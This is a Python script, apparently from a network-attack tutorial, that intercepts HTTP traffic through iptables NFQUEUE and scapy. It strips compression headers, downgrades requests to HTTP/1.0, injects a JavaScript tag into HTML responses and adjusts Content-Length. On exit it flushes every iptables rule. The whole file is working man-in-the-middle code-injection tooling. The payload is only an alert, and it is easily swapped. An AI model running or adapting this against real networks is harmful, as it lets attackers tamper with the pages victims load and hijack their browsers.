#!/usr/bin/env python

import netfilterqueue
import subprocess
from optparse import OptionParser
import scapy.all as scapy
import re

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process(packets):
    scapy_packets = scapy.IP(packets.get_payload())
    if scapy_packets.haslayer(scapy.Raw):
        load = scapy_packets[scapy.Raw].load
        if scapy_packets[scapy.TCP].dport == 10000:
           print("\r[+] Request")
           load = re.sub("Accept-Encoding:.*?\\r\\n","",load )
           load = load.replace("HTTP/1.1","HTTP/1.0")

        elif scapy_packets[scapy.TCP].sport == 10000:
            print("\r[+] Response")
            inject_code = '<script>alert("hello")</script>'
            load = load.replace("</body>",inject_code + "</body>")
            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)",load)
            if content_length_search and "text/html" in load:
                content_number = content_length_search.group(1)
                new_content_length = int(content_number) + len(inject_code)
                load = load.replace(content_number, str(new_content_length))
                # print(scapy_packets.show())

        if load!= scapy_packets[scapy.Raw].load:
            new_packet = set_load(scapy_packets, load)
            packets.set_payload(str(new_packet))

    packets.accept()

def QueueIpMY(num):
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", num])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", num])

def QueueIpOTHER(num):
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", num])

def DequeueIp():
    subprocess.call(["iptables","-F"])

def get_value():
    parse =OptionParser()
    parse.add_option("-n", "--num", dest="num", help="Enter the queue number using -n or -num")
    parse.add_option("-o", "--operatingsys", dest="OS", help="Enter whose network want to cut (kali/other)")
    (value,other) = parse.parse_args()
    if not value.num:
        parse.error("[-] Please specify the number")
    elif not value.OS:
        parse.error("[-] Please specify the os(kali/other)")
    return value

def configure(num):

    if num.OS in "kali":
        QueueIpMY(num.num)
    else:
        QueueIpOTHER(num.num)


try:
    # num = get_value()
    # configure(num)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1,process)
    queue.run()
except KeyboardInterrupt:
    print("[+] Exiting the process and flushing the table")
    DequeueIp()
